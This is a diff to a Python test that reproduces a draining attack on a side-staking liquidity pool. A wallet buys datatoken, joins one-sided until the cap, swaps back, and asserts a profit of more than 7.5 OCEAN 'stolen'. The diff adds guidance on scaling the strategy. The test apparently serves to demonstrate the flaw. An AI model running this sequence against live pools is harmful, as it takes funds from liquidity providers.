@@ -432,8 +432,16 @@ def test_side_staking_steal(
     In this test we try to steal basetoken from the pull
     """
     # Test initial values and setups
-    initial_pool_liquidity = to_wei("10")
-    token_cap = to_wei("50")
+
+    # How to scale the "strategy" keep the same propotion (i.e. x2, x5 x10 all the following values):
+    initial_pool_liquidity_eth = 40
+    token_cap_eth = 200
+    join_pool_step_eth = 20
+    datatoken_buy_amount_basetoken_eth = 4
+    # ---------------------------------------------------------------------------------------------
+
+    initial_pool_liquidity = to_wei(initial_pool_liquidity_eth)
+    token_cap = to_wei(token_cap_eth)
     swap_market_fee = to_wei("0.0001")
     swap_fee = to_wei("0.0001")
     big_allowance = to_wei("100000000")
@@ -441,7 +449,9 @@ def test_side_staking_steal(
     ocean_token = ERC20Token(web3, get_address_of_type(config, "Ocean"))
 
     initial_eth_balance = web3.eth.getBalance(consumer_wallet.address)
-    ocean_token.transfer(another_consumer_wallet.address, to_wei("500"), consumer_wallet)
+    ocean_token.transfer(
+        another_consumer_wallet.address, to_wei("500"), consumer_wallet
+    )
 
     bpool, erc20_token, erc721_token, pool_token = create_nft_erc20_with_pool(
         web3,
@@ -460,7 +470,11 @@ def test_side_staking_steal(
 
     initial_ocean_user_balance = ocean_token.balanceOf(another_consumer_wallet.address)
     swap_exact_amount_in_base_token(
-        bpool, erc20_token, ocean_token, another_consumer_wallet, to_wei("1")
+        bpool,
+        erc20_token,
+        ocean_token,
+        another_consumer_wallet,
+        to_wei(datatoken_buy_amount_basetoken_eth),
     )
 
     # Fill the pool until the cap is reached
@@ -468,9 +482,15 @@ def test_side_staking_steal(
     while previous_pool_datatoken_balance != erc20_token.balanceOf(bpool.address):
         previous_pool_datatoken_balance = erc20_token.balanceOf(bpool.address)
         join_pool_one_side(
-            web3, bpool, ocean_token, another_consumer_wallet, to_wei("5")
+            web3,
+            bpool,
+            ocean_token,
+            another_consumer_wallet,
+            to_wei(join_pool_step_eth),
         )
-    join_pool_one_side(web3, bpool, ocean_token, another_consumer_wallet, to_wei("5"))
+    join_pool_one_side(
+        web3, bpool, ocean_token, another_consumer_wallet, to_wei(join_pool_step_eth)
+    )
 
     swap_exact_amount_in_datatoken(
         bpool,
@@ -503,12 +523,23 @@ def test_side_staking_steal(
     assert pool_token.balanceOf(another_consumer_wallet.address) == 0
     assert erc20_token.balanceOf(another_consumer_wallet.address) == 0
 
-    # I'm stealing from the pool :')
+    final_eth_balance = web3.eth.getBalance(consumer_wallet.address)
+
+    profit = from_wei(
+        ocean_token.balanceOf(another_consumer_wallet.address)
+        - initial_ocean_user_balance,
+        "ether",
+    )
+    assert (
+        from_wei(initial_eth_balance - final_eth_balance, "ether") < 0.00005
+    )  # eth spent ~ < 0.00004? seems wrong
+
+    # We are stealing from the pool :')
     assert (
         ocean_token.balanceOf(another_consumer_wallet.address)
         > initial_ocean_user_balance
     )
-    assert profit > 1.80  # OCEAN stolen
+    assert profit > 7.5  # OCEAN stolen
 
 
 def test_side_staking_constant_rate(
